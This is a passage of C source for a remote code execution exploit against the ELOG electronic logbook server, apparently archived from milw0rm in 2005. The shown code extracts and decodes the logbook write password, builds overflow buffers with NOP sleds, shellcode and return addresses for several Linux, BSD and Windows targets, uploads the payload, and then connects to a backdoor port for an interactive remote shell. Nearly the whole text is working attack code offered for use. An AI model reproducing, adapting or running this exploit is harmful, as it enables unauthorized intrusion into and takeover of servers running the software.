                     }   
                
                 if(strstr(getbuf,ASKEDPASS)) {
                   NPRINTINFO(PASSALERT);
                   crack_the_code(hostname,port,logbook);
                   close(sock);
                   bzero(getbuf,sizeof(getbuf));
                   goto HEAD;
                     }
                
                 if(strstr(getbuf,ATTOPTERR)) {
                   PRINTINFO(READOPTION,1);
                   close(sock);
                   bzero(getbuf,sizeof(getbuf));
                   spy_attr_options(hostname,port,logbook);
                   goto HEAD;
                     }
                 if(strstr(getbuf,ATTERR)) {
                   get_missing_attributes(getbuf,ATTERR,MISSED[globcount].addr);                       
                   ATTNOTFOUND(MISSED[globcount].addr);
                   MAKINGATT (MISSED[globcount].addr);
                   globcount++;
                   bzero(getbuf,sizeof(getbuf));                   
                   re_check_sector(hostname,port,logbook,flag);                  
                     }

                 if(strstr(getbuf,SECTOR_CLEAR)) {
                    PRINTINFO(CLEARAREA,1);
                    close(sock);
                    do_last_stage(hostname,port,logbook);
                    we_r_coming(hostname);
                    }
           }    
 return(1);
}


void                get_missing_attributes(char *attbuf, char *errmessage,char *glob_att)
{
  int            i,j = 0;
  char           *p,*k;
  p              = attbuf;
  k              = glob_att;
  
        bzero(glob_att,sizeof(glob_att));

   if(strstr(p,errmessage)){
      i = strlen(p) - strlen(strstr(p,ATTERRTAG));
         if( *(char *)(p+i) == '&lt;' &amp;&amp; *(char *)(p+i+2) == '&gt;' ) {
           j = i+3;
            for( ; *(char *)(p+j) != '&lt;' &amp;&amp; *(char *)(p+j+3) != '&gt;' ; j++ ) {
                *k++ = *(char *)(p+j);
                }

            *k = '\0';
            return;
          }
    }
 return;
}

void              alloc_all_globalz(void)
{
    ZEROGLOB(glob1_att);   
    ZEROGLOB(glob2_att);  
    ZEROGLOB(glob3_att);   
    ZEROGLOB(glob4_att);   
    ZEROGLOB(glob5_att);   
    ZEROGLOB(glob6_att);   
    ZEROGLOB(glob7_att);   
    ZEROGLOB(glob8_att);   
    ZEROGLOB(glob9_att);  
    ZEROGLOB(glob10_att);

}


int               is_there_attribute(void)
{
  int           i = 0;
  int           j = 0;
   for(i = 0; i&lt;10 ; i++) {
    if(strlen(MISSED[i].addr))
      j++;
    }
return(j);
}


void                  re_check_sector(char *hostname,unsigned short port,char *logbook,int flag)
{ 
  debug++;
  if(recount++ &gt;= 10 ){
  NPRINTINFO(BIGOPTIONLIST);
  exit(1);
  } 
  check_for_clear_sector(hostname,port,logbook,flag);
}


void                 spy_attr_options(char *hostname,unsigned short port,char *logbook)
{
 int                 soc;
 int                 ready;
 int                 yes = 0;
 char                request[REQUESTSIZE];
 fd_set              read_fd;
 struct              timeval    w_t;
 struct              sockaddr_in rem_addr; 
 int                 k,i = 0;
 int                 n = 0;
 char                response[6900];
 char                temp[100];
 char                *p,*z;

        bzero(response,sizeof(response));
        bzero(temp,sizeof(temp));
        make_spy_header(hostname,port,request,logbook);
        w_t.tv_sec   = TIMEOUT;
        w_t.tv_usec  = 0;

         soc      = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
           if(soc &lt; 0){
              perror(&quot;socket&quot;);
              exit(1);     
            }
          if(setsockopt(soc,SOL_SOCKET,SO_REUSEADDR,(char *)&amp;yes,sizeof(int)))
            { perror(&quot;setsockopt&quot;);
              close(soc);
              exit(1);
            }

    memset(&amp;(rem_addr.sin_zero),'\0',8);
    rem_addr.sin_family = AF_INET;
    rem_addr.sin_port   = htons(port);
    rem_addr.sin_addr.s_addr = get_host_ip(hostname);

         if(connect(soc,(const struct sockaddr*)&amp;rem_addr,sizeof(rem_addr)))
          {
          fprintf(stderr,&quot;[-] Can not Connect to server!\n&quot;);
          exit(1);
          }
                 
         if( (send(soc,request,strlen(request),0)) &lt; 0 )
          {
           perror(&quot;send&quot;);
           exit(-1);
           close(soc);
          }
             FD_CLR(soc,&amp;read_fd);
             FD_ZERO(&amp;read_fd);
             FD_SET(soc,&amp;read_fd);
    
         if( (ready = select(soc+1,&amp;read_fd,(fd_set *)NULL,(fd_set *)NULL,&amp;w_t)) &lt; 0)
          {
           perror(&quot;select read socket&quot;);
           close(soc);
           exit(1);
          }
        
         if(FD_ISSET(soc,&amp;read_fd)){         
            i = recv(soc, response, 100, 0);
             if (i &lt; 0) {
              perror(&quot;Cannot receive response&quot;);
              exit(1);
              }
      
           n = i;
            while (i &gt; 0) {
              i = recv(soc, response + n, 100, MSG_DONTWAIT);
              if (i &gt; 0)
              n += i;
              if(i &lt;= 0)
              break;
             }
           response[strlen(response)] = '\0';
           close(soc);
           fflush(stdin);

#define findme(x,y)  {sprintf(x,&quot;Options %s =%c&quot;,y,0x20);}

           for(i = 0 ; MISSED[i].addr != NULL ; i++) {
             findme(temp,MISSED[i].addr);
              if((p = strstr(response,temp)) != NULL) {
                 z = TRASH[i].addr;
                 while( (!iscntrl(*p+1) || isalnum(*p+1))){
                    *z = *(char *)(p + strlen(temp)); 
                    z++;
                    p++;
                 }
              for(k = 0; TRASH[i].addr[k] ; k++) {
                  if((TRASH[i].addr[k] == ',') || (TRASH[i].addr[k] == '\n')) {
                     TRASH[i].addr[k] = '\0';
                   }
              }
              bzero(temp,sizeof(temp));
              }
           }
         
}          
   return;
   
}         


void             crack_the_code(char *hostname,unsigned short port,char *logbook) 
{
 
 int                 soc;
 int                 ready;
 int                 yes = 0;
 char                request[REQUESTSIZE];
 fd_set              read_fd;
 struct     timeval  w_t;
 struct sockaddr_in  rem_addr;
 int                 i = 0;
 int                 n = 0;
 char                response[6900];
 char                wpassbuf[100];
 char                *z; 
 char                *p = wpassbuf;
 char                *w = wpassbufenc; 

        bzero(wpassbuf,sizeof(wpassbuf));
        bzero(wpassbufdec,sizeof(wpassbufdec));
        make_spy_header(hostname,port,request,logbook);

         w_t.tv_sec = TIMEOUT;
         w_t.tv_usec = 0;
          soc = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
           if(soc &lt; 0)
            {
            perror(&quot;socket&quot;);
            exit(1);
            }
    
          if(setsockopt(soc,SOL_SOCKET,SO_REUSEADDR,(char *)&amp;yes,sizeof(int))) {
            perror(&quot;setsockopt&quot;);
            close(soc);
            exit(1);
           }
    
       memset(&amp;(rem_addr.sin_zero),'\0',8);
       rem_addr.sin_family = AF_INET;   
       rem_addr.sin_port   = htons(port);
       rem_addr.sin_addr.s_addr = get_host_ip(hostname);
       PRINTINFO(GETINGPASS,1);       
           if(connect(soc,(const struct sockaddr*)&amp;rem_addr,sizeof(rem_addr))) {
             fprintf(stderr,&quot;[-] Can not Connect to server!\n&quot;);
             exit(1);
            }
      
           if( (send(soc,request,strlen(request),0)) &lt; 0 ){
             perror(&quot;send&quot;);
             exit(-1);
             close(soc);
           }
             FD_CLR(soc,&amp;read_fd);
             FD_ZERO(&amp;read_fd);
             FD_SET(soc,&amp;read_fd);

  
           if( (ready = select(soc+1,&amp;read_fd,(fd_set *)NULL,(fd_set *)NULL,&amp;w_t)) &lt; 0){
             perror(&quot;select read socket&quot;);
             close(soc);
             exit(1);
            }
               if(FD_ISSET(soc,&amp;read_fd)){
                  i = recv(soc, response, 30, 0);
                   if (i &lt; 0) {
                    perror(&quot;Cannot receive response&quot;);
                    return ;
                   }    
                  n = i;
                   while (i &gt; 0) {
                    i = recv(soc, response + n, 30, MSG_DONTWAIT);
                       if (i &gt; 0)
                       n += i;
                       if(i &lt;= 0)
                       break;
                    }
          response[strlen(response)] = '\0';
          close(soc);
          fflush(stdout);
               if((z = strstr(response,&quot;Write Password=&quot;)) != NULL) 
                 while((*(char *)(z + 15)) != EOF  &amp;&amp; isgraph(*(char *)(z + 15))) {
                   if( *(char *)(z + 15) == 'W') {
                     if(! isascii(*(char *)(z+16)))
                      break;
                     }
                 *p = *(char *)(z + 15);
                 z++;
                 p++;       
               }
      
                 else {NPRINTINFO(PASSFAILED); exit(EXIT_FAILURE);}
                 base64_decode(wpassbuf,wpassbufdec);
                 strncpy(w,wpassbuf,sizeof(wpassbuf));
         
                     for(i = 0; isgraph(wpassbufdec[i]) ; i++)
                      { }
                    wpassbufdec[i] = '\0';
                    PRINTINFO(PASSSUCCESS,1);
                    printf(&quot;&quot;GREEN&quot;[+]Write Password = &quot;DEFAULT&quot; &quot;GREEN&quot;%s&quot;DEFAULT&quot;\n&quot;,wpassbufdec);
      }
}


void           make_spy_header(char *hostname,short port, char *buf,char *logbook)
{

 char          *url_enc = urlencode(logbook);

 bzero(buf,sizeof(buf));
 strncpy(buf,GETREQ,sizeof(GETREQ));
 sprintf(buf + strlen(buf), &quot;%s/&quot;,url_enc);
 sprintf(buf + strlen(buf), &quot;%s&quot;,GETREQCMD);
 strcat (buf,  HTTPVER);
 sprintf(buf + strlen(buf), &quot;Host: %s:%d\r\n&quot;, hostname,port);
 sprintf(buf + strlen(buf), &quot;User-Agent: ELOG\r\n&quot;);
 sprintf(buf + strlen(buf), &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;);
 sprintf(buf + strlen(buf), &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;);
 sprintf(buf + strlen(buf), &quot;Accept-Encoding: gzip,deflate\r\n&quot;);
 sprintf(buf + strlen(buf), &quot;Keep-Alive: 300\r\n&quot;);
 sprintf(buf + strlen(buf), &quot;Connection: keep-alive\r\n&quot;);
 sprintf(buf + strlen(buf), &quot;Authorization: Basic %s\r\n\r\n&quot;,encuserandpass);
}


void        authorize_user(char *user , char *pass)
{

     char          *p;
     char          *k;
       p = (char *)&amp;userandpass[0];
       k = (char *)&amp;encuserandpass[0];

       bzero(userandpass,sizeof(userandpass));
       bzero(encuserandpass,sizeof(encuserandpass));

     sprintf(p,&quot;%s%c&quot;,user,':');
     sprintf(p + strlen(p) ,&quot;%s&quot;,pass);
     base64_encode(userandpass,encuserandpass);

}

void        build_att_buffer(int choice,int vendor)
{
   unsigned int *i;
   char              *c;
     if(choice == 0)
      c = lnx_shellcode;
     if(choice == 1)
      c = bsd_shellcode;
     if(choice == 2) {
      bzero(windozetext,sizeof(windozetext));
      c = win_shellcode;
      memset(windozebuf,'Z',sizeof(windozebuf));
      memset(windozetext,NOP,sizeof(windozetext));
      i = (int *)&amp;windozebuf[242];
     *i = TARGETZ[vendor].ret;
      strcpy(&amp;windozetext[sizeof(windozetext) -strlen(c)],c);  
      return;
      }       
   bzero(shbuffer,sizeof(shbuffer));
   bzero(bigbuffer,sizeof(bigbuffer));
   bzero(debianbuffer,sizeof(debianbuffer));
   memset(bigbuffer,NOP,sizeof(bigbuffer));

   memset(shbuffer,'A',sizeof(shbuffer));
   memset(debianbuffer,'A',sizeof(debianbuffer));
   memset(fedorabuf,'B',sizeof(fedorabuf));
   strcpy(&amp;bigbuffer[BIGBUFSIZE - strlen(c)],c);
    if(vendor == 4) {
     i = (int *)&amp;fedorabuf[284];
    }    
    if(vendor == 5 || vendor == 2 ){
    i = (int *)&amp;debianbuffer[260];
    }
    if((vendor != 4) &amp;&amp; (vendor != 5) &amp;&amp; (vendor != 6) &amp;&amp; (vendor != 2)){   
    i = (int *)&amp;shbuffer[284];
    }
   *i = TARGETZ[vendor].ret;
 return;
}


void        do_last_stage(char *hostname,short port,char *logbook)
{
 int                 soc;
 int                 yes = 0;
 struct              sockaddr_in rem_addr;
 char                angelform[SENDBUFSIZE]; 
 char                *content;
 int                 flagz = UPLOADME;
 
 bzero(angelform,sizeof(angelform));
 content = make_http_content(flagz,logbook);
 strcat(angelform,make_request_header(logbook,boundary,0));
 strcat(angelform,content);
         soc = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
           if(soc &lt; 0)
            {
            perror(&quot;socket&quot;); 
            exit(1);
            }
                     
          if(setsockopt(soc,SOL_SOCKET,SO_REUSEADDR,(char *)&amp;yes,sizeof(int))) {
            perror(&quot;setsockopt&quot;);
            close(soc);  
            exit(1);
           }
       memset(&amp;(rem_addr.sin_zero),'\0',8);
       rem_addr.sin_family = AF_INET;
       rem_addr.sin_port   = htons(port);
       rem_addr.sin_addr.s_addr = get_host_ip(hostname);

         if(connect(soc,(const struct sockaddr*)&amp;rem_addr,sizeof(rem_addr))) {
             fprintf(stderr,&quot;[-] Can not Connect to server!\n&quot;);
             exit(1);
            }
                 
           if( (send(soc,angelform,strlen(angelform),0)) &lt; 0 ){
             perror(&quot;send&quot;);
             exit(-1);
             close(soc); 
           }

   close(soc);
return;
}


void                we_r_coming(char* hostname)
{
       int sock;
       int yes;
       short port;
       struct sockaddr_in rem_addr;
           
           port = BACKDOOR;
           if(id == 6){
           port = WINBACKDOOR;
           }
           if(id == 2 || id == 10 || id == 11){
           port = BSDBACKDOOR;
           }             
           sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
           if(sock &lt; 0)
            {
            perror(&quot;socket&quot;);
            exit(1);
            }
                
          if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(char *)&amp;yes,sizeof(int))) {
            perror(&quot;setsockopt&quot;);
            close(sock);
            exit(1);    
            }

                 memset(&amp;(rem_addr.sin_zero),'\0',8);
                 rem_addr.sin_family = AF_INET;
                 rem_addr.sin_port   = htons(port);
                 rem_addr.sin_addr.s_addr = get_host_ip(hostname);
         
                    sleep(4);
                    if(connect(sock,(const struct sockaddr*)&amp;rem_addr,sizeof(rem_addr))) {
                      NPRINTINFO(REMCRASHED);
                      close(sock);
                      exit(1);
                      }
                 shell(sock);
exit(0);
}

void                shell(int sock)
{
        fd_set  fd_read;
        char buffer[1024],*cmd = (id == 6 ? WINCMD : COMMAND);
        int size;

        FD_ZERO(&amp;fd_read);
        FD_SET(sock, &amp;fd_read);
        FD_SET(0, &amp;fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock,&amp;fd_read);
                FD_SET(0,&amp;fd_read);

                if (select(FD_SETSIZE, &amp;fd_read, NULL, NULL, NULL) &lt; 0 ) break;

                if (FD_ISSET(sock, &amp;fd_read)) {

                        if((size = recv(sock, buffer, sizeof(buffer), 0)) &lt; 0){
                                NPRINTINFO(NODATA);
                                exit(1);
                        }

                        if (write(1, buffer, size) &lt; 0) break;
                }

                if (FD_ISSET(0, &amp;fd_read)) {

                        if((size = read(0, buffer, sizeof(buffer))) &lt; 0){
                                NPRINTINFO(NODATA);
                                exit(1);
                        }

                        if (send(sock, buffer, size, 0) &lt; 0) break;
                }

                usleep(30);
        }

        NPRINTINFO(REMDOWN);
        exit(0);
}


void             banner(void)
{
 puts(&quot;&quot;GREEN&quot;n4rk0tix(4DDICT3DZ)&quot;DEFAULT&quot;  *nix/Windows Elog E.L remote $hell exploit\n&quot;);
 return;
}
 
void             usage(char * arg)
{
 fprintf(stderr,&quot;Usage :%s -h hostname\n&quot;
                &quot;    \t\t\t -p port\n&quot;
                &quot;    \t\t\t -l logbookname\n&quot;
                &quot;    \t\t\t -o Operating System ID\n&quot;
                &quot;    \t\t\t -d List Operating system ID\n&quot;
                &quot;    \t\t\t -u logbook user for read(If required)\n&quot;
                &quot;    \t\t\t -r logbook password for read (If required)\n&quot;
                &quot;    \t\t\t -w logbook password for write(If required)\n&quot;,arg
         );
 return;
}
 
void             listos(void)
{
  int         i;
   for(i = 0; TARGETZ[i].id != -1 ; i++)
    {
     printf(&quot;%d = %s\n&quot;,i,TARGETZ[i].distro);
    }

return;
}
/* Vert3k, hic bir zaman senin inandigina inanmadim, koda tapan ben deilim*/</pre>
// milw0rm.com [2005-02-09]
</html>

